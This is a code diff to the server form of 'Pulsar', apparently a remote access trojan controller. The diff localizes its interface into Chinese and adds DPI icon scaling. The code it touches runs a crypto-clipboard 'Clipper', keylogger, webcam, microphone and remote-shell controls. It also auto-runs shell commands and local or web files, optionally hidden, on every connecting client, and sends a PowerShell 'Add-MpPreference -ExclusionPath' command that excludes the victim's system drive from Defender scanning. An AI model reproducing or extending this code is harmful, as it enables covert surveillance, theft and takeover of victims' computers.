@@ -1,4 +1,4 @@
-﻿using Newtonsoft.Json;
+using Newtonsoft.Json;
 using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Administration.Actions;
@@ -137,9 +137,10 @@ namespace Pulsar.Server.Forms
             OfflineClientRepository.Initialize();
             OfflineClientRepository.ResetOnlineState();
             InitializeComponent();
+            ApplyHighDpiImages();
             _clientSortTimer = new System.Windows.Forms.Timer { Interval = 150 };
             _clientSortTimer.Tick += ClientSortTimer_Tick;
-            Text = $"Pulsar Premium - {ServerVersion.Display}";
+            Text = ServerVersion.WindowTitle;
             statsElementHost?.ShowLoading();
             heatMapElementHost?.ShowLoading();
             typeof(ListView).InvokeMember("DoubleBuffered",
@@ -230,10 +231,10 @@ namespace Pulsar.Server.Forms
                     {
                         int selected = lstClients.SelectedItems.Count;
                         int connected = ListenServer?.ConnectedClients?.Length ?? 0;
-                        string baseTitle = $"Pulsar Premium - {ServerVersion.Display}";
+                        string baseTitle = ServerVersion.WindowTitle;
                         this.Text = (selected > 0)
-                            ? $"{baseTitle} - Connected: {connected} [Selected: {selected}]"
-                            : $"{baseTitle} - Connected: {connected}";
+                            ? $"{baseTitle} - 已连接：{connected} [已选：{selected}]"
+                            : $"{baseTitle} - 已连接：{connected}";
                     }
                     finally
                     {
@@ -358,7 +359,7 @@ namespace Pulsar.Server.Forms
                 lstClients.StretchColumnByIndex(accountTypeIndex);
             }
 
-            EventLog("欢迎使用 Pulsar。", "info");
+            EventLog($"欢迎使用 {ServerVersion.AppName}。", "info");
             InitializeServer();
             AutostartListening();
             EventLogVisability();
@@ -663,15 +664,15 @@ namespace Pulsar.Server.Forms
 
                 var defaultStats = new (string Label, string Value)[]
                 {
-                    ("CPU", "N/A"),
-                    ("GPU", "N/A"),
+                    ("CPU", "不可用"),
+                    ("GPU", "不可用"),
                     ("RAM", "0 GB"),
-                    ("Uptime", "N/A"),
-                    ("Antivirus", "N/A"),
-                    ("Default Browser", "N/A"),
-                    ("Ping", "N/A"),
-                    ("Webcam", "N/A"),
-                    ("AFK Time", "N/A")
+                    ("运行时间", "不可用"),
+                    ("杀毒软件", "不可用"),
+                    ("默认浏览器", "不可用"),
+                    ("Ping", "不可用"),
+                    ("摄像头", "不可用"),
+                    ("离开时间", "不可用")
                 };
 
                 foreach (var (label, value) in defaultStats)
@@ -1137,8 +1138,8 @@ namespace Pulsar.Server.Forms
                            "1. 右键点击列表中的任务\n" +
                            "2. 选择 '切换执行模式'\n\n" +
                            "执行模式显示在'参数'列中：\n" +
-                           "- '[Once]' = 每个客户端一次\n" +
-                           "- '[Every]' = 每次连接";
+                           "- '[单次]' = 每个客户端一次\n" +
+                           "- '[每次]' = 每次连接";
 
             MessageBox.Show(message, "自动任务执行模式",
                            MessageBoxButtons.OK, MessageBoxIcon.Information);
@@ -1274,7 +1275,7 @@ namespace Pulsar.Server.Forms
 
                         ClipperCheckbox.Checked = data.ContainsKey("ClipperEnabled") && Convert.ToBoolean(data["ClipperEnabled"]);
 
-                        ClipperCheckbox.Text = ClipperCheckbox.Checked ? "Stop" : "Start";
+                        ClipperCheckbox.Text = ClipperCheckbox.Checked ? "停止" : "启动";
                     }
                 }
                 catch (Exception ex)
@@ -2866,7 +2867,8 @@ namespace Pulsar.Server.Forms
                 }
                 else if (!string.IsNullOrWhiteSpace(autoTask.Param2))
                 {
-                    hidden = string.Equals(autoTask.Param2, "Hidden", StringComparison.OrdinalIgnoreCase);
+                    hidden = string.Equals(autoTask.Param2, "Hidden", StringComparison.OrdinalIgnoreCase)
+                          || string.Equals(autoTask.Param2, "隐藏", StringComparison.OrdinalIgnoreCase);
                 }
 
                 foreach (Client c in clients)
@@ -3072,7 +3074,7 @@ namespace Pulsar.Server.Forms
                 using (OpenFileDialog openFileDialog = new OpenFileDialog())
                 {
                     openFileDialog.InitialDirectory = "c:\\";
-                    openFileDialog.Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp;*.gif";
+                    openFileDialog.Filter = "图片文件|*.jpg;*.jpeg;*.png;*.bmp;*.gif";
                     openFileDialog.FilterIndex = 1;
                     openFileDialog.RestoreDirectory = true;
 
@@ -3753,7 +3755,7 @@ namespace Pulsar.Server.Forms
 
         private void excludeSystemDriveToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            AddTask("Exclude System Drives", "", "");
+            AddTask("排除系统盘", "", "");
         }
 
         private void groupBox1_Enter(object sender, EventArgs e)
@@ -3764,11 +3766,11 @@ namespace Pulsar.Server.Forms
         {
             if (ClipperCheckbox.Checked == true)
             {
-                ClipperCheckbox.Text = "Stop";
+                ClipperCheckbox.Text = "停止";
             }
             else
             {
-                ClipperCheckbox.Text = "Start";
+                ClipperCheckbox.Text = "启动";
             }
         }
 
@@ -3862,7 +3864,7 @@ namespace Pulsar.Server.Forms
         {
             using (SaveFileDialog saveFileDialog = new SaveFileDialog())
             {
-                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
+                saveFileDialog.Filter = "文本文件 (*.txt)|*.txt|所有文件 (*.*)|*.*";
                 saveFileDialog.Title = "保存日志文件";
                 saveFileDialog.DefaultExt = "txt";
 
@@ -3873,7 +3875,7 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        private void saveSlectedToolStripMenuItem_Click(object sender, EventArgs e)
+        private void saveSelectedToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (string.IsNullOrWhiteSpace(DebugLogRichBox.SelectedText))
             {
@@ -3882,7 +3884,7 @@ namespace Pulsar.Server.Forms
 
             using (SaveFileDialog saveFileDialog = new SaveFileDialog())
             {
-                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
+                saveFileDialog.Filter = "文本文件 (*.txt)|*.txt|所有文件 (*.*)|*.*";
                 saveFileDialog.Title = "保存选中文本";
                 saveFileDialog.DefaultExt = "txt";
 
@@ -4040,7 +4042,8 @@ namespace Pulsar.Server.Forms
                 }
                 else if (!string.IsNullOrWhiteSpace(autoTask.Param2))
                 {
-                    hidden = string.Equals(autoTask.Param2, "Hidden", StringComparison.OrdinalIgnoreCase);
+                    hidden = string.Equals(autoTask.Param2, "Hidden", StringComparison.OrdinalIgnoreCase)
+                          || string.Equals(autoTask.Param2, "隐藏", StringComparison.OrdinalIgnoreCase);
                 }
 
                 foreach (Client c in clients)
@@ -4300,7 +4303,7 @@ namespace Pulsar.Server.Forms
             var item = new ListViewItem(task.Title ?? string.Empty);
             item.SubItems.Add(task.Param1 ?? string.Empty);
 
-            string executionModeText = task.ExecutionMode == AutoTaskExecutionMode.OncePerClient ? "[Once]" : "[Every]";
+            string executionModeText = task.ExecutionMode == AutoTaskExecutionMode.OncePerClient ? "[单次]" : "[每次]";
             string argumentsText = task.Param2 ?? string.Empty;
             if (!string.IsNullOrEmpty(argumentsText))
             {
@@ -4333,14 +4336,14 @@ namespace Pulsar.Server.Forms
 
             RegisterAutoTaskBehavior(new AutoTaskBehavior(
                 remoteExecuteToolStripMenuItem.Name,
-                "Remote Execute (Local File)",
+                "远程执行（本地文件）",
                 remoteExecuteToolStripMenuItem,
                 CreateRemoteExecuteLocalAutoTask,
                 (frm, client, task) => frm.ExecuteRemoteExecuteLocalAutoTask(client, task)));
 
             RegisterAutoTaskBehavior(new AutoTaskBehavior(
                 remoteExecuteToolStripMenuItem.Name,
-                "Remote Execute (Web File)",
+                "远程执行（Web 文件）",
                 remoteExecuteToolStripMenuItem,
                 CreateRemoteExecuteWebAutoTask,
                 (frm, client, task) => frm.ExecuteRemoteExecuteWebAutoTask(client, task)));
@@ -4621,24 +4624,24 @@ namespace Pulsar.Server.Forms
 
             switch (task.Title)
             {
-                case "Remote Execute":
+                case "远程执行":
                     ExecuteRemoteExecuteLocalAutoTask(client, task);
                     break;
-                case "Shell Command":
+                case "Shell 命令":
                     if (!string.IsNullOrWhiteSpace(task.Param2))
                     {
                         string host = string.IsNullOrWhiteSpace(task.Param1) ? "cmd.exe" : task.Param1;
                         client.Send(new DoSendQuickCommand { Host = host, Command = task.Param2 });
                     }
                     break;
-                case "Exclude System Drives":
+                case "排除系统盘":
                     if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                     {
                         string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                         client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
                     }
                     break;
-                case "Message Box":
+                case "消息框":
                     client.Send(new DoShowMessageBox
                     {
                         Caption = task.Param1 ?? string.Empty,
@@ -4661,7 +4664,7 @@ namespace Pulsar.Server.Forms
             using var openFileDialog = new OpenFileDialog
             {
                 Title = "选择要在新客户端上执行的文件",
-                Filter = "Executable Files (*.exe;*.bat;*.cmd;*.ps1)|*.exe;*.bat;*.cmd;*.ps1|All Files (*.*)|*.*",
+                Filter = "可执行文件 (*.exe;*.bat;*.cmd;*.ps1)|*.exe;*.bat;*.cmd;*.ps1|所有文件 (*.*)|*.*",
                 Multiselect = false
             };
 
@@ -4756,7 +4759,7 @@ namespace Pulsar.Server.Forms
             {
                 Title = menuItem.Text,
                 Param1 = url,
-                Param2 = isUpdate ? "Update Mode" : "Execute",
+                Param2 = isUpdate ? "更新模式" : "执行",
                 Param3 = isUpdate.ToString(),
                 Param4 = executeInMemory.ToString()
             };
@@ -4804,7 +4807,7 @@ namespace Pulsar.Server.Forms
                 {
                     Title = menuItem.Text,
                     Param1 = dialog.Lang ?? string.Empty,
-                    Param2 = dialog.Hidden ? "Hidden" : "Visible",
+                    Param2 = dialog.Hidden ? "隐藏" : "可见",
                     Param3 = dialog.Script ?? string.Empty,
                     Param4 = dialog.Hidden.ToString()
                 };
@@ -4844,7 +4847,7 @@ namespace Pulsar.Server.Forms
                 {
                     Title = menuItem.Text,
                     Param1 = dialog.Url ?? string.Empty,
-                    Param2 = dialog.Hidden ? "Hidden" : "Visible",
+                    Param2 = dialog.Hidden ? "隐藏" : "可见",
                     Param3 = dialog.Hidden.ToString()
                 };
             }
@@ -4855,7 +4858,7 @@ namespace Pulsar.Server.Forms
             using (var openFileDialog = new OpenFileDialog
             {
                 Title = "选择壁纸图片",
-                Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp;*.gif|All Files (*.*)|*.*",
+                Filter = "图片文件|*.jpg;*.jpeg;*.png;*.bmp;*.gif|所有文件 (*.*)|*.*",
                 Multiselect = false
             })
             {
@@ -4998,7 +5001,7 @@ namespace Pulsar.Server.Forms
 
             _searchLabel = new Label
             {
-                Text = "🔍 Search:",
+                Text = "🔍 搜索：",
                 Visible = false,
                 Location = new System.Drawing.Point(150, 13),
                 Size = new System.Drawing.Size(65, 15),
@@ -5671,7 +5674,7 @@ namespace Pulsar.Server.Forms
             using (OpenFileDialog ofd = new OpenFileDialog())
             {
                 ofd.Multiselect = false;
-                ofd.Filter = "Binary Files (*.bin)|*.bin|All Files (*.*)|*.*";
+                ofd.Filter = "二进制文件 (*.bin)|*.bin|所有文件 (*.*)|*.*";
 
                 if (ofd.ShowDialog() != DialogResult.OK)
                     return;
@@ -5693,7 +5696,7 @@ namespace Pulsar.Server.Forms
             using (OpenFileDialog ofd = new OpenFileDialog())
             {
                 ofd.Multiselect = false;
-                ofd.Filter = "DLL Files (*.dll)|*.dll|All Files (*.*)|*.*";
+                ofd.Filter = "DLL 文件 (*.dll)|*.dll|所有文件 (*.*)|*.*";
 
                 if (ofd.ShowDialog() != DialogResult.OK)
                     return;
@@ -5777,6 +5780,41 @@ namespace Pulsar.Server.Forms
             {
                 c.Send(new DoClearTempDirectory());
             }
+        }
+
+        private void ApplyHighDpiImages()
+        {
+            float scale = DpiImageScaling.GetScaleFactor(this);
+
+            // 通用递归适配（覆盖控件树里的 ToolStrip / 右键菜单 / ListView 的 ImageList，如国旗 imgFlags）。
+            DpiImageScaling.ApplyToForm(this);
+
+            DpiImageScaling.ApplyToToolStrip(menuStrip, scale);
+            DpiImageScaling.ApplyToToolStrip(statusStrip, scale);
+            DpiImageScaling.ApplyToToolStrip(contextMenuStrip, scale);
+            DpiImageScaling.ApplyToToolStrip(OfflineClientsContextMenuStrip, scale);
+            DpiImageScaling.ApplyToToolStrip(DebugContextMenuStrip, scale);
+            DpiImageScaling.ApplyToToolStrip(NotificationContextMenuStrip, scale);
+            DpiImageScaling.ApplyToToolStrip(TasksContextMenuStrip, scale);
+
+            // 客户端预览下方的快捷按钮：改用 BackgroundImage + Zoom，
+            // 让图标随（框架已按 DPI 放大的）按钮尺寸自动等比缩放。
+            DpiImageScaling.ApplyToIconButton(btnQuickRemoteDesktop, scale);
+            DpiImageScaling.ApplyToIconButton(btnQuickWebcam, scale);
+            DpiImageScaling.ApplyToIconButton(btnQuickListenToMicrophone, scale);
+            DpiImageScaling.ApplyToIconButton(btnQuickFileExplorer, scale);
+            DpiImageScaling.ApplyToIconButton(btnQuickRemoteShell, scale);
+            DpiImageScaling.ApplyToIconButton(btnQuickFileTransfer, scale);
+            DpiImageScaling.ApplyToIconButton(btnQuickKeylogger, scale);
+
+            var quickTip = new ToolTip { InitialDelay = 300 };
+            quickTip.SetToolTip(btnQuickRemoteDesktop, "远程桌面");
+            quickTip.SetToolTip(btnQuickWebcam, "摄像头");
+            quickTip.SetToolTip(btnQuickListenToMicrophone, "监听麦克风");
+            quickTip.SetToolTip(btnQuickFileExplorer, "文件管理");
+            quickTip.SetToolTip(btnQuickRemoteShell, "远程终端");
+            quickTip.SetToolTip(btnQuickFileTransfer, "文件传输");
+            quickTip.SetToolTip(btnQuickKeylogger, "键盘记录");
         }
     }
 
@@ -5875,6 +5913,7 @@ namespace Pulsar.Server.Forms
                 if (icon != null)
                 {
                     item.Image = icon.ToBitmap();
+                    item.ImageScaling = ToolStripItemImageScaling.None;
                 }
                 item.Click += (s, e) =>
                 {
@@ -5892,8 +5931,7 @@ namespace Pulsar.Server.Forms
             {
                 if (_form.contextMenuStrip == null) return;
                 ToolStripMenuItem parent = EnsureSection(_form.contextMenuStrip.Items, section);
-                var item = new ToolStripMenuItem(text);
-                item.Tag = _pluginTag;
+                var item = CreatePluginLeafItem(text);
                 item.Click += (s, e) =>
                 {
                     var clients = _form.GetSelectedClients();
@@ -5909,13 +5947,8 @@ namespace Pulsar.Server.Forms
             _form.Invoke((MethodInvoker)delegate
             {
                 if (_form.contextMenuStrip == null) return;
-                ToolStripMenuItem parent = EnsureSection(_form.contextMenuStrip.Items, section);
-                var item = new ToolStripMenuItem(text);
-                item.Tag = _pluginTag;
-                if (icon != null)
-                {
-                    item.Image = icon.ToBitmap();
-                }
+                ToolStripMenuItem parent = EnsureSection(_form.contextMenuStrip.Items, section, icon);
+                var item = CreatePluginLeafItem(text);
                 item.Click += (s, e) =>
                 {
                     var clients = _form.GetSelectedClients();
@@ -5936,8 +5969,7 @@ namespace Pulsar.Server.Forms
                 {
                     parent = EnsureSection(parent.DropDownItems, sections[i]);
                 }
-                var item = new ToolStripMenuItem(text);
-                item.Tag = _pluginTag;
+                var item = CreatePluginLeafItem(text);
                 item.Click += (s, e) =>
                 {
                     var clients = _form.GetSelectedClients();
@@ -5953,17 +5985,12 @@ namespace Pulsar.Server.Forms
             _form.Invoke((MethodInvoker)delegate
             {
                 if (_form.contextMenuStrip == null) return;
-                ToolStripMenuItem parent = EnsureSection(_form.contextMenuStrip.Items, sections[0]);
+                ToolStripMenuItem parent = EnsureSection(_form.contextMenuStrip.Items, sections[0], icon);
                 for (int i = 1; i < sections.Length; i++)
                 {
                     parent = EnsureSection(parent.DropDownItems, sections[i]);
                 }
-                var item = new ToolStripMenuItem(text);
-                item.Tag = _pluginTag;
-                if (icon != null)
-                {
-                    item.Image = icon.ToBitmap();
-                }
+                var item = CreatePluginLeafItem(text);
                 item.Click += (s, e) =>
                 {
                     var clients = _form.GetSelectedClients();
@@ -5992,17 +6019,54 @@ namespace Pulsar.Server.Forms
             });
         }
 
-        private ToolStripMenuItem EnsureSection(ToolStripItemCollection root, string name)
+        private ToolStripMenuItem EnsureSection(ToolStripItemCollection root, string name, Icon icon = null)
         {
             var found = root.OfType<ToolStripMenuItem>().FirstOrDefault(mi => mi.Text == name);
             if (found == null)
             {
                 found = new ToolStripMenuItem(name);
                 found.Tag = _pluginTag;
+                ApplyMenuIcon(found, icon);
                 root.Add(found);
                 _pluginMenuItems.Add(found);
             }
+            else if (icon != null && found.Image == null)
+            {
+                ApplyMenuIcon(found, icon);
+            }
+
+            ConfigurePluginSectionDropDown(found);
             return found;
+        }
+
+        private static void ConfigurePluginSectionDropDown(ToolStripMenuItem section)
+        {
+            if (section?.DropDown is ToolStripDropDownMenu dropDownMenu)
+            {
+                dropDownMenu.ShowImageMargin = false;
+            }
+        }
+
+        private ToolStripMenuItem CreatePluginLeafItem(string text)
+        {
+            return new ToolStripMenuItem(text)
+            {
+                Tag = _pluginTag,
+                DisplayStyle = ToolStripItemDisplayStyle.Text
+            };
+        }
+
+        private void ApplyMenuIcon(ToolStripMenuItem item, Icon icon)
+        {
+            if (item == null || icon == null)
+            {
+                return;
+            }
+
+            // 直接用原图，交给容器 ImageScalingSize（按 DPI 绝对像素）统一约束，不替换 bitmap。
+            item.Image = icon.ToBitmap();
+            float scale = DpiImageScaling.GetScaleFactor(_form);
+            DpiImageScaling.ApplyToPluginMenuItem(item, scale);
         }
     }
 }
